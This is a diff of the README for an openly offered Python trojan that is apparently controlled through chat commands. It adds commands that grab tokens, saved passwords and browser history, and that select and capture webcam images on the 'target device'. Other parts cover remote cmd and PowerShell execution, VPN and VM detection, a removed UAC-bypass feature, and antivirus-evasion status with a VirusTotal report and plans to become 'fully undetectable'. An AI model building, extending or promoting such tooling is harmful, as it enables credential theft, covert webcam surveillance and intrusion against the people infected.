@@ -4,9 +4,9 @@
 ###### For more information please go to my [Info Page](https://airstrike.school/Socrates)
 ###### To make a .exe build please visit the [Documentation Wiki](https://github.com/GiveUsername/ShittyTrojan.py/wiki)
 ###### If you want to see what I'm planning on adding next, got to the [ShittyTrojan Trello](https://trello.com/b/ck9dFLnF/shittytrojan)
-###### Currently FUD on Malwarebytes, SentinelOne, Sophos, Microsoft, McAffee.
-###### Detected on known AV's: Kaspersky, Avast, AVG.
-###### [View VirusTotal Report](https://www.virustotal.com/gui/file/bf3306f6dcfa56a2f5f737b22a2ce82b5074f636762b19ab39dce171fde581f7/detection)
+###### Currently FUD on Malwarebytes, SentinelOne, McAffee.
+###### Detected on known AV's: Kaspersky, Avast, AVG, Microsoft, Sophos.
+###### [View VirusTotal Report](https://www.virustotal.com/gui/file/bf3306f6dcfa56a2f5f737b22a2ce82b5074f636762b19ab39dce171fde581f7/detection) (13/64 AntiVirus Flags)
 
 # Commands
 
@@ -27,11 +27,13 @@
 ##### EXECUTION: 
 ###### !cmd - Executes a Cmd Prompt command on the computer / Syntax: !cmd systeminfo
 ###### !shell - Executes a PowerShell command on the computer / Syntax: !shell whoami
-###### !uacbypass - Elevates the .exe to Admin (Still under-development, most of the time will not work properly)
 
 ##### INFORMATION:
 ###### !info - Grabs information on the computer
 ###### !geolocate - Attempts to find the geo-location of the computer (Sort of broken if VPN is active)
+###### !token - Grabs all available tokens on the target device
+###### !passwords - Grabs all available passwords on the target device
+###### !history - Grabs default browser history
 ###### !admincheck - Checks if the executable file has Administrator Permissions
 ###### !vpn - Searches for vpns within the computer (Application & Browser Extention)
 
@@ -40,7 +42,9 @@
 ###### !audio - Uses Text-To-Speech to say a given phrase / Syntax: !audio Hello
 
 ##### SCREEN:
-###### !cam - Takes a picture using a camera if one is available (Sort-of Broken)
+###### !webcams - Grabs all available webcams on the target device
+###### !selectcam - Selects a given webcam / Syntax: !selectcam Webcam 0
+###### !getcam - Takes a cam picture using selected webcam
 ###### !screenshot - Takes a screenshot of the main computer screen (Secondary not available)
 
 ##### OTHER:
@@ -62,3 +66,16 @@
 ###### !wallpaper - Needs to work on Win 11
 ###### !uacbypass - Must have a higher chance of elevation (Currently at about 8% per use)
 ###### Trojan Detection - Make .exe file FUD (Fully Undetected/Undetectable)
+
+###  3/30/24
+##### Commands:
+###### !token - Grabs all available tokens on the target device
+###### !passwords - Grabs all available passwords on the target device
+###### !history - Grabs default browser history
+###### !webcams - Grabs all available webcams on the target device
+###### !selectcam - Selects a given webcam / Syntax: !selectcam Webcam 0
+###### !getcam - Takes a cam picture using selected webcam
+#### Command Updates:
+###### Optimized most commands that detect Vpn's and VM's
+###### Removed !uacbypass (Too Buggy + Barely Worked Functionaly)
+
